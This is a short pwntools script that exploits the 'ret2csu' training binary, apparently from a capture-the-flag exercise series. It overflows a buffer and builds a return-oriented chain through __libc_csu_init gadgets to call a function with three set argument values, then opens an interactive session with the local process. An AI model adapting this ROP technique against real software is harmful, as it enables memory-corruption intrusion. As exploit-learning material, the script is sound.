from pwn import *
exe = context.binary = ELF('ret2csu')
libc = ELF('libret2csu.so')

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

payload = b'A' * 40
payload += p64(0x000000000040069a)
payload += p64(0)
payload += p64(1)
payload += p64(0x601020)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(0x400680)
payload += p64(0) * 7

r = process(exe.path)
r.sendline(payload)
r.interactive()
